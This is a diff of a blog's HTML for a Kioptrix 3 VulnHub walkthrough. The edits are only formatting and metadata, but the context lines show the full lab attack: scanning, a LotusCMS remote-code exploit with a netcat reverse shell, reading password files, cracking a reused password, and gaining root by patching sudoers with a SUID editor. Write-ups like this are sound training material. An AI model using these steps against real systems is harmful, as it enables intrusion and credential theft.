@@ -20,7 +20,7 @@
     <meta property="og:url" content="http://localhost:2368/kioptrix-walkthrough-3/">
     <meta property="og:image" content="http://localhost:2368/content/images/2018/07/Kioptrix-3-Cover.jpeg">
     <meta property="article:published_time" content="2017-09-12T04:49:33.000Z">
-    <meta property="article:modified_time" content="2018-07-30T07:13:06.000Z">
+    <meta property="article:modified_time" content="2018-07-30T08:07:38.000Z">
     <meta property="article:tag" content="Boot2Root">
     <meta property="article:tag" content="VulnHub">
     <meta property="article:tag" content="OSCP">
@@ -47,12 +47,7 @@
     "publisher": {
         "@type": "Organization",
         "name": "rootshellz",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "http://localhost:2368/favicon.ico",
-            "width": 60,
-            "height": 60
-        }
+        "logo": "http://localhost:2368/content/images/2018/07/Blog-Logo.png"
     },
     "author": {
         "@type": "Person",
@@ -71,7 +66,7 @@
     "headline": "Kioptrix: Level 1.2 (#3) Walkthrough",
     "url": "http://localhost:2368/kioptrix-walkthrough-3/",
     "datePublished": "2017-09-12T04:49:33.000Z",
-    "dateModified": "2018-07-30T07:13:06.000Z",
+    "dateModified": "2018-07-30T08:07:38.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "http://localhost:2368/content/images/2018/07/Kioptrix-3-Cover.jpeg",
@@ -128,7 +123,7 @@
 <h1 id="setup">Setup</h1>
 <p>The challenge description and Readme file tells us that in addition to spinning up the VM and letting DHCP assign it an address, we also need to point <strong>kioptrix3.com</strong> to the VM's IP.  The Readme also confirms this is another web challenge, which makes sense given the required name mapping.  Let's spin up the VM, find it on the network, and then point the domain name via our Kali attack box's hosts file.</p>
 <p>We use an nmap Ping scan of our local subnet to identify the target.</p>
-<pre><code>root@kali:~# nmap -T4 -sn 172.16.2.0/24
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:01 PDT
 Nmap scan report for 172.16.2.1
@@ -146,12 +141,12 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 12.86 seconds
 </code></pre>
 <p>Process of elimination of the know addresses means 172.16.2.132 is our target.</p>
 <p>Per the Readme, let's point kioptrix3.com to 172.16.2.132:</p>
-<pre><code>root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts
+<pre><code class="language-shell-output">root@kali:~# echo "172.16.2.132  kioptrix3.com" &gt;&gt; /etc/hosts
 </code></pre>
 <h1 id="initialscanningandenumeration">Initial Scanning and Enumeration</h1>
 <p>With out target identified and name resolution set up, let's move on to initial scanning of the VM.</p>
 <p>TCP scanning:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sV -O -p- kioptrix3.com
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- kioptrix3.com
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:08 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -172,7 +167,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
 </code></pre>
 <p>UDP scanning:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.132
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:09 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -187,7 +182,7 @@ Nmap done: 1 IP address (1 host up) scanned in 307.11 seconds
 </code></pre>
 <p>Not much to work with, but at least we know where to focus our effort.</p>
 <p>Deeper Apache enumeration with relevant nmap scripts:</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -p 80 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse 172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 80 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse 172.16.2.132
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-30 23:20 PDT
 Nmap scan report for kioptrix3.com (172.16.2.132)
@@ -481,16 +476,16 @@ Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
 <p>The <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">repo</a> contains both <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">Bash</a> and <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.rb">Ruby</a> stand-alone exploitation scripts.  Thanks <a href="https://github.com/Hood3dRob1n">Hood3dRob1n</a>!  Let's go for the Bash script...  After a quick review, we verify that the script is safe to run and understand its functionality.  When run, the script will check that we have a vulnerable target, ask us to select from a menu of payloads, and then run the exploit.  Interestingly, it appears Hood3dRob1n wrote this script with Kioptrix #3 (1.2) in mind.</p>
 <h2 id="exploitingtherce">Exploiting the RCE</h2>
 <p>We start our listener:</p>
-<pre><code>root@kali:~# nc -vvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337
 listening on [any] 1337 ...
 </code></pre>
 <p>Then run the sploit:</p>
-<pre><code>root@kali:~# ./lotusRCE.sh
+<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh
 USAGE: ./lotusRCE.sh target LotusCMS_path
 EX: ./lotusRCE.sh 192.168.1.36 /lcms/
 EX: ./lotusRCE.sh ki0ptrix3.com /
 </code></pre>
-<pre><code>root@kali:~# ./lotusRCE.sh kioptrix3.com /
+<pre><code class="language-shell-output">root@kali:~# ./lotusRCE.sh kioptrix3.com /
 Path found, now to check for vuln....
 
 &lt;/html&gt;Hood3dRob1n
@@ -508,7 +503,7 @@ OK, open your local listener and choose the method for back connect:
 #? 1
 </code></pre>
 <p>Flipping back to our listener:</p>
-<pre><code>root@kali:~# nc -vvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -vvlp 1337
 listening on [any] 1337 ...
 connect to [172.16.2.129] from kioptrix3.com [172.16.2.132] 35306
 
@@ -526,7 +521,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <h2 id="localenumeration">Local Enumeration</h2>
 <p>I could accomplish this step using my Linux enumeration script, but let's have a go by hand.  If we can't find any low hanging fruit, we will fall back to the more thorough script.</p>
 <p>We first need to see what we are working with:</p>
-<pre><code>uname -a
+<pre><code class="language-shell-output">uname -a
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
 
 cat /etc/*release*
@@ -536,7 +531,7 @@ DISTRIB_CODENAME=hardy
 DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
 </code></pre>
 <p>From here, let's see what users we have on the system:</p>
-<pre><code>cat /etc/passwd
+<pre><code class="language-shell-output">cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -593,7 +588,7 @@ loneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 -0400 2011
 dreg                                       **Never logged in**
 </code></pre>
 <p>Besides root, it looks like loneferret is the only other user to have accessed the system.  Let's see what he has been up to:</p>
-<pre><code>ls -la /home/loneferret
+<pre><code class="language-shell-output">ls -la /home/loneferret
 total 64
 drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .
 drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
@@ -640,7 +635,7 @@ For more information, see:
   http://www.trapkit.de/tools/checksec.html
 </code></pre>
 <p>Well, that is all very interesting.  We have a couple of references to the <em>ht</em> application as well as a script, that per the [link](<a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a> from the help dialogue, "is designed to test what standard Linux OS and PaX security features are being used."  On a hunch, what if we check the security on the the ht executable?</p>
-<pre><code>which ht
+<pre><code class="language-shell-output">which ht
 /usr/local/bin/ht
 
 ls -l /usr/local/bin/ht
@@ -652,7 +647,7 @@ ht 2.0.18 (POSIX) 07:26:02 on Apr 16 2011
 (c) 1999-2009 Sebastian Biallas &lt;sb@biallas.net&gt;
 </code></pre>
 <p>First, we notice the file is owned by root and has the SUID bit set along with word-executable permissions.  This means that anyone can run this executable file and when they do, it will assume the effective UID of root (0).  Given that this appears to be an editor, I think we have found our way in.</p>
-<pre><code>ht /etc/shadow
+<pre><code class="language-shell-output">ht /etc/shadow
 
 python -c 'import pty; pty.spawn("/bin/sh")'
 
@@ -676,7 +671,7 @@ sudo -l
 <h2 id="localenumerationpt2">Local Enumeration Pt. 2</h2>
 <p>We have a shell as the <em>www-data</em> user, which means we should have full control of the web application that we compromised.  We didn't spend too much time enumerating the web app before we found the PHP exploit, so it's possible there is other functionality at play.  We now have the advantage of auditing the web app from the inside.</p>
 <p>On a hunch, let's try for a quick and easy win:</p>
-<pre><code>$ pwd
+<pre><code class="language-shell-output">$ pwd
 pwd
 /home/www/kioptrix3.com
 $ 
@@ -713,7 +708,7 @@ grep gallarific_mysql ./*/*
 [... snip ...]
 </code></pre>
 <p>Hmm, that seems helpful.  Let's see what is stored in the DB:</p>
-<pre><code>$ mysql -u root -p
+<pre><code class="language-shell-output">$ mysql -u root -p
 mysql -u root -p
 Enter password: fuckeyou
 
@@ -781,7 +776,7 @@ select * from gallarific_users;
 <p>Awesome, <a href="https://crackstation.net/">CrackStation</a> was able to easily crack loneferret's password.</p>
 <h2 id="becomingloneferret">Becoming loneferret</h2>
 <p>We now have the lonferret user's Gallerific web application password, but that doesn't seem to help us much in getting root on the box.  However, maybe the user reused the same password for his local account on the server.  Let's find out:</p>
-<pre><code>root@kali:~# ssh loneferret@172.16.2.132
+<pre><code class="language-shell-output">root@kali:~# ssh loneferret@172.16.2.132
 loneferret@172.16.2.132's password: [starwars]
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
 [... snip ...]
@@ -802,7 +797,7 @@ User loneferret may run the following commands on this host:
 <p>Since ht is an editor and we are able to use it to edit any file as root, we have a lot of options here for privilege escalation.  We can now access /etc/shadow by running <code>sudo ht /etc/shadow</code>, but let's try something else instead.  We will go after sudo itself.</p>
 <p>From our enumeration, we know there are entries in the /etc/sudoers for the loneferret user.  To get root, we will update /etc/sudoers to allow us to run everything with sudo, including su (i.e. <code>sudo su -</code>).</p>
 <p>Let's edit the file:</p>
-<pre><code>loneferret@Kioptrix3:~$ ls -l /etc/sudoers
+<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ ls -l /etc/sudoers
 -r--r----- 1 root root 614 2017-09-10 20:29 /etc/sudoers
 
 loneferret@Kioptrix3:~$ cat /etc/sudoers
@@ -819,14 +814,14 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 <p>Even though we shouldn't have permission to read the sudoers file, using the setuid / setgid ht executable, we are able to load the file.<br>
 </p>
 <p>Now let's do some hex patching.  We want to change</p>
-<pre><code>│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|│
+<pre><code class="language-hexdump">│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|│
 │00000140 53 53 57 44 3a 20 21 2f-75 73 72 2f 62 69 6e 2f |SSWD: !/usr/bin/|│
 │00000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|│
 │00000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme||
 </code></pre>
 <p><code>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</code></p>
 <p>to</p>
-<pre><code>│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 28 41 4c 4c |eferret ALL=(ALL|│
+<pre><code class="language-hexdump">│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 28 41 4c 4c |eferret ALL=(ALL|│
 │00000140 29 20 41 4c 4c 0a 23 2f-75 73 72 2f 62 69 6e 2f |) ALL?#/usr/bin/|│
 │00000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|│
 │00000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme|│
@@ -837,7 +832,7 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 <p>Let's make the change and save the file using ht:<br>
 </p>
 <p>After saving the file, let's see if we win:</p>
-<pre><code>loneferret@Kioptrix3:~$ sudo -l
+<pre><code class="language-shell-output">loneferret@Kioptrix3:~$ sudo -l
 [sudo] password for loneferret: 
 User loneferret may run the following commands on this host:
     (ALL) ALL
@@ -854,7 +849,7 @@ root@Kioptrix3:~#
 <p>Woot, woot!  There is is, we have a root shell on our target!</p>
 <h1 id="enumeratinggoodies">Enumerating Goodies</h1>
 <p>Now that we are root, let's see what we can find on the box:</p>
-<pre><code>root@Kioptrix3:~# cd /root
+<pre><code class="language-shell-output">root@Kioptrix3:~# cd /root
 
 root@Kioptrix3:~# ls -l
 total 16
@@ -907,7 +902,7 @@ public domain I used them.
 </code></pre>
 <h1 id="conclusion">Conclusion</h1>
 <p>Well, that's it for this challenge.  However, looking back on where we ended up, I am almost certain there are other ways to crack this VM.  For example, I imagine there is a SQL injection I missed on the web application that would have led us to the loneferret password hash in the database without first exploiting the LotusCMS RCE vulnerability.  I might go back and try to find this later.  Alternatively if there was another way to find the loneferret username, an SSH brute force using the rockyou password list would have been successful:</p>
-<pre><code>root@kali:~# grep ^starwars$ /usr/share/wordlists/rockyou.txt 
+<pre><code class="language-shell-output">root@kali:~# grep ^starwars$ /usr/share/wordlists/rockyou.txt 
 starwars
 </code></pre>
 <p>This just goes to show, both on challenge VMs and real world servers, there is usually more than one way to pop the box.</p>
